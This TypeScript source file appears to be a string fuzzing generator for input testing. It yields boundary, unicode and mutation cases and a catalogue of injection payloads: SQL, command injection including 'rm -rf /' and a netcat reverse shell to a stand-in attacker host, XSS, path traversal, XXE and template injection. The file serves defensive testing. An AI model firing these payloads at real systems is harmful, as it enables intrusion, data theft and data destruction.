// ============================================================================
// String Fuzzing Generator
// Generates various string mutations and edge cases
// ============================================================================

import { FuzzContext, GeneratedValue } from '../types.js';

/**
 * Common injection payloads for security testing
 */
export const INJECTION_PAYLOADS = {
  // SQL Injection
  sql: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "1; DELETE FROM users",
    "1' AND '1'='1",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
  ],

  // NoSQL Injection
  nosql: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "this.a > 1"}',
    '{"$regex": ".*"}',
    '{"$or": [{}]}',
    '{"$and": [{"$gt": ""}]}',
    "{'$gt': ''}",
    '[$ne]=1',
  ],

  // Command Injection
  command: [
    '; rm -rf /',
    '| cat /etc/passwd',
    '& cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)',
    '; ls -la',
    '| ls -la',
    '&& whoami',
    '|| whoami',
    '; echo vulnerable',
    '\n/bin/sh',
    '| nc -e /bin/sh attacker.com 1234',
  ],

  // XSS
  xss: [
    '<script>alert(1)</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  ],

  // Path Traversal
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '/etc/passwd%00.jpg',
    '....\\....\\....\\windows\\system32',
    'file:///etc/passwd',
  ],

  // LDAP Injection
  ldap: [
    '*',
    '*)(&',
    '*)(uid=*))(|(uid=*',
    'admin)(&)',
    '*)((|userPassword=*)',
    '\\00',
  ],

  // XML Injection
  xml: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<![CDATA[<script>alert(1)</script>]]>',
    '<!--',
    ']]>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
  ],

  // Template Injection
  template: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    '@(7*7)',
    '{{constructor.constructor("return this")()}}',
    '{{config}}',
    '{{self.__class__.__mro__[2].__subclasses__()}}',
  ],

  // Header Injection
  header: [
    'value\r\nX-Injected: header',
    'value\nX-Injected: header',
    'value%0d%0aX-Injected:%20header',
    '\r\n\r\n<html>injected</html>',
  ],
};

/**
 * Special characters for boundary testing
 */
export const SPECIAL_CHARS = {
  nullByte: '\x00',
  bell: '\x07',
  backspace: '\x08',
  tab: '\t',
  newline: '\n',
  carriageReturn: '\r',
  formFeed: '\x0c',
  escape: '\x1b',
  delete: '\x7f',
  nbsp: '\u00a0',
  zeroWidth: '\u200b',
  bom: '\ufeff',
  replacement: '\ufffd',
};

/**
 * Unicode edge cases
 */
export const UNICODE_EDGE_CASES = [
  // RTL override
  '\u202e\u0041\u0042\u0043',
  // Zero-width characters
  'a\u200bb\u200cc\u200dd',
  // Homoglyphs
  'аdmin', // Cyrillic 'а' instead of Latin 'a'
  'pаypal.com', // Cyrillic 'а'
  // Combining characters
  'e\u0301', // é using combining acute
  'a\u0300\u0301\u0302\u0303\u0304', // Multiple combining marks
  // Surrogate pairs
  '\uD83D\uDE00', // Emoji
  '\uD800', // Unpaired high surrogate
  '\uDC00', // Unpaired low surrogate
  // Overlong UTF-8 sequences (as string)
  'test\xc0\xaf',
  // Unicode normalization issues
  '\u00e9', // é (precomposed)
  'e\u0301', // é (decomposed)
  '\ufb01', // fi ligature
];

/**
 * Generate fuzzed strings
 */
export function* generateStrings(ctx: FuzzContext): Generator<GeneratedValue<string>> {
  // Empty and whitespace
  yield { value: '', category: 'boundary', description: 'Empty string' };
  yield { value: ' ', category: 'boundary', description: 'Single space' };
  yield { value: '\t', category: 'boundary', description: 'Tab character' };
  yield { value: '\n', category: 'boundary', description: 'Newline' };
  yield { value: '\r\n', category: 'boundary', description: 'CRLF' };
  yield { value: '   ', category: 'boundary', description: 'Multiple spaces' };
  yield { value: ' \t\n\r ', category: 'boundary', description: 'Mixed whitespace' };

  // Length boundaries
  if (ctx.constraints?.maxLength) {
    const maxLen = ctx.constraints.maxLength as number;
    yield { value: 'a'.repeat(maxLen - 1), category: 'boundary', description: `Length ${maxLen - 1}` };
    yield { value: 'a'.repeat(maxLen), category: 'boundary', description: `Length ${maxLen} (max)` };
    yield { value: 'a'.repeat(maxLen + 1), category: 'boundary', description: `Length ${maxLen + 1} (over max)` };
  }

  if (ctx.constraints?.minLength) {
    const minLen = ctx.constraints.minLength as number;
    if (minLen > 0) {
      yield { value: 'a'.repeat(minLen - 1), category: 'boundary', description: `Length ${minLen - 1} (under min)` };
    }
    yield { value: 'a'.repeat(minLen), category: 'boundary', description: `Length ${minLen} (min)` };
    yield { value: 'a'.repeat(minLen + 1), category: 'boundary', description: `Length ${minLen + 1}` };
  }

  // Very long strings
  yield { value: 'a'.repeat(1000), category: 'stress', description: 'Long string (1000)' };
  yield { value: 'a'.repeat(10000), category: 'stress', description: 'Very long string (10000)' };
  yield { value: 'a'.repeat(100000), category: 'stress', description: 'Huge string (100000)' };

  // Special characters
  for (const [name, char] of Object.entries(SPECIAL_CHARS)) {
    yield { value: char, category: 'special', description: `Special char: ${name}` };
    yield { value: `prefix${char}suffix`, category: 'special', description: `Embedded ${name}` };
  }

  // Null byte injection
  yield { value: 'valid\x00malicious', category: 'injection', description: 'Null byte injection' };
  yield { value: 'file.txt\x00.jpg', category: 'injection', description: 'Null byte extension' };

  // Unicode edge cases
  for (const unicode of UNICODE_EDGE_CASES) {
    yield { value: unicode, category: 'unicode', description: 'Unicode edge case' };
  }

  // Injection payloads (based on context)
  if (ctx.fieldType === 'email' || ctx.fieldName?.toLowerCase().includes('email')) {
    for (const payload of generateEmailFuzz()) {
      yield payload;
    }
  }

  if (ctx.fieldType === 'url' || ctx.fieldName?.toLowerCase().includes('url')) {
    for (const payload of generateUrlFuzz()) {
      yield payload;
    }
  }

  // Security payloads
  if (ctx.includeSecurityPayloads !== false) {
    for (const [category, payloads] of Object.entries(INJECTION_PAYLOADS)) {
      for (const payload of payloads) {
        yield { value: payload, category: 'injection', description: `${category} injection` };
      }
    }
  }

  // Format-specific fuzzing
  if (ctx.constraints?.format) {
    for (const fuzzed of fuzzFormat(ctx.constraints.format as string)) {
      yield fuzzed;
    }
  }

  // Random mutations
  for (let i = 0; i < (ctx.iterations ?? 100); i++) {
    yield { value: generateRandomString(ctx.rng), category: 'random', description: 'Random string' };
  }
}

/**
 * Generate email-specific fuzz values
 */
function* generateEmailFuzz(): Generator<GeneratedValue<string>> {
  const emailFuzz = [
    'not-an-email',
    'missing@domain',
    '@nodomain.com',
    'spaces in@email.com',
    'email@domain',
    'email@.com',
    'email@domain..com',
    'email@@domain.com',
    '.email@domain.com',
    'email.@domain.com',
    'email@domain.com.',
    'a'.repeat(65) + '@domain.com', // Local part too long
    'email@' + 'a'.repeat(256) + '.com', // Domain too long
    'email@localhost',
    'email@127.0.0.1',
    'email@[127.0.0.1]',
    '"email with spaces"@domain.com',
    'email+tag@domain.com',
    'email%tag@domain.com',
    'test@域名.com', // IDN domain
    'тест@domain.com', // Cyrillic local part
  ];

  for (const email of emailFuzz) {
    yield { value: email, category: 'format', description: 'Invalid email format' };
  }
}

/**
 * Generate URL-specific fuzz values
 */
function* generateUrlFuzz(): Generator<GeneratedValue<string>> {
  const urlFuzz = [
    'not-a-url',
    'http://',
    'https://',
    '://',
    'http://localhost',
    'http://127.0.0.1',
    'http://0.0.0.0',
    'http://[::1]',
    'file:///etc/passwd',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'http://user:pass@domain.com',
    'http://domain.com:99999',
    'http://domain.com/../../../etc/passwd',
    'http://evil.com?url=http://victim.com',
    'http://evil.com#http://victim.com',
    'http://domain.com/path?a=1&a=2', // Parameter pollution
    'http://①②③.com', // Unicode domain
    'http://domain%00.com', // Null byte in domain
    '//evil.com', // Protocol-relative
    'http://domain.com\r\nX-Injected: header', // Header injection
  ];

  for (const url of urlFuzz) {
    yield { value: url, category: 'format', description: 'URL fuzzing' };
  }
}

/**
 * Fuzz a specific format (regex)
 */
function* fuzzFormat(_format: string): Generator<GeneratedValue<string>> {
  // Generate strings that almost match but fail
  yield { value: '', category: 'format', description: 'Empty for format' };
  yield { value: ' ', category: 'format', description: 'Whitespace for format' };
  yield { value: 'x', category: 'format', description: 'Single char for format' };
  yield { value: '123', category: 'format', description: 'Numbers only for format' };
  yield { value: 'abc', category: 'format', description: 'Letters only for format' };
  yield { value: '!@#$%', category: 'format', description: 'Special chars for format' };
}

/**
 * Generate a random string using the provided RNG
 */
function generateRandomString(rng?: () => number): string {
  const random = rng ?? Math.random;
  const length = Math.floor(random() * 100);
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(random() * chars.length));
  }
  return result;
}

/**
 * Mutate an existing string
 */
export function mutateString(value: string, rng?: () => number): string {
  const random = rng ?? Math.random;
  const mutations = [
    // Delete random character
    () => {
      if (value.length === 0) return value;
      const idx = Math.floor(random() * value.length);
      return value.slice(0, idx) + value.slice(idx + 1);
    },
    // Insert random character
    () => {
      const idx = Math.floor(random() * (value.length + 1));
      const char = String.fromCharCode(Math.floor(random() * 128));
      return value.slice(0, idx) + char + value.slice(idx);
    },
    // Replace random character
    () => {
      if (value.length === 0) return value;
      const idx = Math.floor(random() * value.length);
      const char = String.fromCharCode(Math.floor(random() * 128));
      return value.slice(0, idx) + char + value.slice(idx + 1);
    },
    // Swap adjacent characters
    () => {
      if (value.length < 2) return value;
      const idx = Math.floor(random() * (value.length - 1));
      return value.slice(0, idx) + value[idx + 1] + value[idx] + value.slice(idx + 2);
    },
    // Duplicate a section
    () => {
      if (value.length === 0) return value;
      const start = Math.floor(random() * value.length);
      const len = Math.floor(random() * (value.length - start)) + 1;
      const section = value.slice(start, start + len);
      return value.slice(0, start + len) + section + value.slice(start + len);
    },
    // Uppercase/lowercase flip
    () => {
      if (value.length === 0) return value;
      const idx = Math.floor(random() * value.length);
      const char = value[idx]!;
      const flipped = char === char.toUpperCase() ? char.toLowerCase() : char.toUpperCase();
      return value.slice(0, idx) + flipped + value.slice(idx + 1);
    },
    // Insert null byte
    () => {
      const idx = Math.floor(random() * (value.length + 1));
      return value.slice(0, idx) + '\x00' + value.slice(idx);
    },
  ];

  const mutation = mutations[Math.floor(random() * mutations.length)]!;
  return mutation();
}
